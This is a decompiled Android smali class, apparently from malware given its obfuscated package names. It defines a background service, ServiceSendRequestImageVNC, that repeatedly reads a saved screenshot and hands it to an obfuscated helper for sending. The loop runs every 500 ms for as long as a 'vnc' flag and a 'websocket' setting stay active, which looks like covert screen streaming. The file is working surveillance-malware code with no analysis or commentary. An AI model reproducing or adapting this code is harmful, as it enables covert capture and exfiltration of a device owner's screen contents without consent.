.class public Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field public fddo:I


# direct methods
.method public constructor <init>()V
    .registers 2

    const-string v0, "ServiceSendRequestImageVNC"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const/4 v0, 0x0

    iput v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;->fddo:I

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 10

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    const-string v1, "vnc"

    invoke-virtual {v0, p0, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "stop"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const-string v4, ""

    const-string v5, "websocket"

    if-nez v2, :cond_21

    invoke-virtual {v0, p0, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_24

    :cond_21
    invoke-virtual {p0, p1}, Landroid/app/IntentService;->stopService(Landroid/content/Intent;)Z

    :cond_24
    :goto_24
    :try_start_24
    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v6, 0x1f4

    invoke-virtual {v2, v6, v7}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_2b
    .catch Ljava/lang/InterruptedException; {:try_start_24 .. :try_end_2b} :catch_2c
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_2b} :catch_7f

    goto :goto_30

    :catch_2c
    move-exception v2

    :try_start_2d
    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_30
    invoke-virtual {v0, p0, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_7b

    invoke-virtual {v0, p0, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_45

    goto :goto_7b

    :cond_45
    new-instance v2, Ljava/io/File;

    const/4 v6, 0x0

    invoke-virtual {p0, v6}, Landroid/app/IntentService;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v6

    const-string v7, "screenshot.jpg"

    invoke-direct {v2, v6, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/io/File;)[B

    move-result-object v2

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget v7, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;->fddo:I

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, ".jpg"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, p0, v2, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;[BLjava/lang/String;)V

    iget v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;->fddo:I

    add-int/lit8 v2, v2, 0x1

    iput v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;->fddo:I

    iget v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;->fddo:I

    const/16 v6, 0xb

    if-lt v2, v6, :cond_24

    const/4 v2, 0x0

    iput v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;->fddo:I
    :try_end_7a
    .catch Ljava/lang/Exception; {:try_start_2d .. :try_end_7a} :catch_7f

    goto :goto_24

    :cond_7b
    :goto_7b
    invoke-virtual {p0, p1}, Landroid/app/IntentService;->stopService(Landroid/content/Intent;)Z

    return-void

    :catch_7f
    const-string v2, "error"

    const-string v6, "Send screenshot"

    invoke-virtual {v0, v2, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_24
.end method
